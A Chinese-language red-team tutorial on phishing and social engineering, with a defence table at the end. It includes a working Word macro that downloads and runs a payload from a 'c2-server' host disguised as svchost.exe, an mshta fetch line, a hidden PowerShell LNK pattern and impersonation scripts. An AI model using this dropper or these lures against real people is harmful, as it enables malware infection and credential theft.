# 钓鱼与社会工程学

## 概述

社会工程学是利用人类心理弱点而非技术漏洞来获取信息或访问权限的攻击方式。钓鱼（Phishing）是最常见的社会工程学攻击手段，据 Verizon DBIR 报告，超过 70% 的数据泄露事件涉及钓鱼。对于红队而言，钓鱼往往是获得初始访问最有效的方法。

## 钓鱼类型

| 类型 | 目标 | 定制程度 | 成功率 | 示例 |
|------|------|---------|--------|------|
| 广撒网钓鱼 (Mass) | 大量随机用户 | 低 | 0.1%-1% | 冒充银行发送通用邮件 |
| 鱼叉式钓鱼 (Spear) | 特定个人/部门 | 高 | 10%-30% | 冒充 IT 部门发给运维人员 |
| 鲸钓 (Whaling) | CEO/高管 | 极高 | 15%-45% | 冒充董事发送紧急财务请求 |
| 短信钓鱼 (Smishing) | 手机用户 | 中 | 5%-15% | 冒充快递通知附带链接 |
| 语音钓鱼 (Vishing) | 电话目标 | 极高 | 20%-50% | 冒充技术支持要求提供密码 |
| 二维码钓鱼 (Quishing) | 扫码用户 | 低-中 | 3%-10% | 冒充优惠券二维码 |
| 水坑攻击 (Watering Hole) | 特定网站访问者 | 极高 | 依赖于网站流量 | 入侵目标常访问的第三方网站 |

## 附件型 Payload

### 宏文档 (.docm)

```vb
' Word 宏模板 - 下载并执行 payload
Sub AutoOpen()
    Dim obj As Object
    Set obj = CreateObject("MSXML2.XMLHTTP")
    obj.Open "GET", "http://c2-server/payload.exe", False
    obj.Send
    
    Dim bytes() As Byte
    bytes = obj.responseBody
    
    ' 写入 temp 目录
    Dim fso As Object
    Set fso = CreateObject("Scripting.FileSystemObject")
    Dim tempPath As String
    tempPath = Environ("TEMP") & "\svchost.exe"
    
    ' 保存并执行
    Dim stream As Object
    Set stream = CreateObject("ADODB.Stream")
    stream.Open
    stream.Type = 1
    stream.Write bytes
    stream.SaveToFile tempPath, 2
    stream.Close
    
    CreateObject("WScript.Shell").Run tempPath
End Sub
```

### HTA / LNK / ISO

| 攻击手法 | 绕过机制 | 说明 |
|---------|---------|------|
| HTA 应用 | 绕过 Mark-of-Web 扫描 | mshta.exe http://c2-server/payload.hta |
| LNK 快捷方式 | 隐藏命令行参数 | Powershell -WindowStyle Hidden -Enc ... |
| ISO 镜像文件 | 绕过 Mark-of-Web | ISO 挂载后文件不受 MoW 保护 |
| 压缩包 (ZIP/RAR) | 绕过邮件附件扫描 | 压缩后附加密码，正文中提供密码 |
| OneNote (.one) | 绕过传统附件检测 | 嵌入恶意脚本标签 |

## 链接型钓鱼

### 凭据收割

攻击者通过克隆合法网站的登录页面，诱导用户输入凭据：

```
真实 URL:  https://login.microsoftonline.com/
钓鱼 URL:  https://login-microsoftonline.security-verify.com/  （视觉近似）

或使用 Unicode 欺骗:
  - 使用 Cyrillic 'о' 替代 Latin 'o' → mіcrosoft.com
  - 使用同形异义字 (Homoglyph) 攻击
```

### OAuth Consent 钓鱼

诱导用户授权恶意 OAuth 应用：

```
Google OAuth Consent Screen:
  App Name: Secure PDF Viewer
  Scope:    Read/Write access to your email, contacts, and files
  Publisher: (未验证)

一旦用户点击 "Allow"，攻击者获得 Google API token，可长期访问用户数据。
```

## MFA 疲劳攻击

MFA 疲劳（MFA Push Bombing）是近年来最有效的绕过 MFA 的方法之一：

```
攻击流程:
1. 攻击者获得用户密码（通过密码喷洒/泄露数据库）
2. 尝试登录目标账户 → MFA 推送通知发送到用户手机
3. 连续发送多次 MFA 推送（10-30+ 次）
4. 用户因烦躁/误操作点击 "批准"
5. 攻击者立即访问账户并改变 MFA 配置

真实案例: 2022 年 Uber 数据泄露事件即采用了 MFA 疲劳技术
```

## 假装 (Pretexting) 设计

构建令人信服的情景脚本：

| 情景 | 话术要点 | 联系方式 |
|------|---------|---------|
| IT 支持 | "检测到您的电脑存在安全风险，需要远程协助" | 电话/VNC |
| 安全告警 | "有可疑登录尝试，请确认是否为本人操作" | 邮件/短信 |
| 快递通知 | "您的包裹因地址问题无法送达，请更新信息" | 短信/邮件 |
| 供应商冒充 | "我是合作的 XXX 公司的项目经理，需要更新财务信息" | 电话/邮件 |
| 会议邀请 | "CEO 要求召开紧急会议，请通过此链接加入" | 邮件/日历 |
| 法律威胁 | "您的账户存在违规操作，请在 24 小时内回复" | 邮件 |

## 目标信息收集 (OSINT)

社会工程学攻击前需要进行充分的目标调研：

- **LinkedIn 分析**：组织结构、岗位、人际关系
- **企业网站**：供应商信息、技术栈、联系方式
- **GitHub**：员工泄露的配置、代码中的注释
- **Shodan/Censys**：企业暴露面（VPN、邮件服务器）
- **Have I Been Pwned**：历史数据泄露中的员工凭据
- **社交媒体**：个人爱好、出行计划、朋友圈信息

## 防御手段

| 防御层 | 技术/措施 | 说明 |
|--------|----------|------|
| 邮件认证 | DMARC/DKIM/SPF | 防止域被伪造 |
| 链接检测 | URL 过滤 (ATP/Zscaler) | 实时扫描链接信誉 |
| 附件检测 | 沙箱/Sandbox | 在隔离环境分析附件行为 |
| 用户意识 | 钓鱼模拟测试 | 定期进行内部钓鱼演练 |
| MFA | FIDO2 硬件密钥 | 物理安全密钥，无法远程钓鱼 |
| 报告机制 | 一键报告钓鱼按钮 | 促进用户上报可疑邮件 |
